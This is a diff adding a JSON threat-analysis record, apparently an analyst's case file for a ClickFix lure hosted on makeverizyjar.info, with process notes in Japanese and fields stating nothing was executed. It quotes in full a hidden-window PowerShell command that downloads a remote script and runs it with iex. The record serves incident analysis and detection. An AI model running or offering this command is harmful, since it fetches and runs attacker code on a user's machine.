@@ -1,0 +1,88 @@
+{
+  "schema_version": 1,
+  "case_id": "20260825-command-pt3",
+  "analysis_date": "2026-08-25",
+  "domain": "makeverizyjar.info",
+  "source": {
+    "path": "C:\\Users\\Administrator\\Desktop\\kentai\\clickfix-command.txt",
+    "sha256": "8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0",
+    "captured_labels": [
+      "pt3"
+    ],
+    "file_last_write_local": "2026-08-25T00:06:47.081740+09:00"
+  },
+  "command": {
+    "raw": "powershell -w h \"iex(irm 'makeverizyjar.info/3aaef5a225beec2c' -UseBasicParsing)\"; exit",
+    "sha256": "5feb1ae28bba2dab1f4ef79911a36d2f467f3dd2c3fb0bc51a0a5a12db4ffe1a",
+    "length": 87,
+    "duplicate_count": 1,
+    "pattern": "Invoke-RestMethod + Invoke-Expression",
+    "deobfuscated": null,
+    "stage_locator_raw": "makeverizyjar.info/3aaef5a225beec2c",
+    "stage_url_normalized": "https://makeverizyjar.info/3aaef5a225beec2c",
+    "status": "recovered_not_executed",
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": [
+      {
+        "sequence": 1,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      }
+    ],
+    "process_chain_status": "recovered_from_command_not_executed",
+    "command_line_public": "powershell -w h \"iex(irm 'makeverizyjar.info/3aaef5a225beec2c' -UseBasicParsing)\"; exit",
+    "command_line_normalized": "powershell -w h \"iex(irm 'makeverizyjar.info/3aaef5a225beec2c' -UseBasicParsing)\"; exit",
+    "command_line_length": 87,
+    "command_line_status": "recovered_not_executed",
+    "command_line_source": "analyst_provided_clickfix_command_file",
+    "command_sha256": "5feb1ae28bba2dab1f4ef79911a36d2f467f3dd2c3fb0bc51a0a5a12db4ffe1a"
+  },
+  "process_analysis": {
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": "利用者起点（Run dialogまたは既存shell） → powershell.exe → 同一powershell.exe内でHTTP応答をIEX評価",
+    "status": "static_candidate_not_observed",
+    "details": [
+      "-w hでWindowStyle Hiddenを指定する。",
+      "irm -UseBasicParsingで取得した応答をiexへ直接渡す。",
+      "末尾のexitで呼出し元shell終了を試みる。",
+      "取得文字列はschemeを省略しており、-UseBasicParsingはWindows PowerShell互換性を意識した指定である。"
+    ]
+  },
+  "retrieval": {
+    "analyst_probe_url": "https://makeverizyjar.info/3aaef5a225beec2c",
+    "status": "http_404",
+    "http_status": 404,
+    "bytes": 146,
+    "body_sha256": "55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0",
+    "body_type": "html",
+    "payload_recovered": false,
+    "evidence_role": "current_context_only_not_runtime_proof",
+    "javascript_executed": false,
+    "powershell_executed": false,
+    "payload_executed": false
+  },
+  "terminal_payload": {
+    "status": "not_retrieved",
+    "family": null,
+    "sha256": null,
+    "additional_processes": [],
+    "persistence": [],
+    "final_attacker_command": null
+  },
+  "techniques": [
+    "T1204.004",
+    "T1059.001",
+    "T1105"
+  ],
+  "safety": {
+    "captured_command_executed": false,
+    "downloaded_script_executed": false,
+    "payload_executed": false,
+    "network_method": "bounded GET only"
+  }
+}
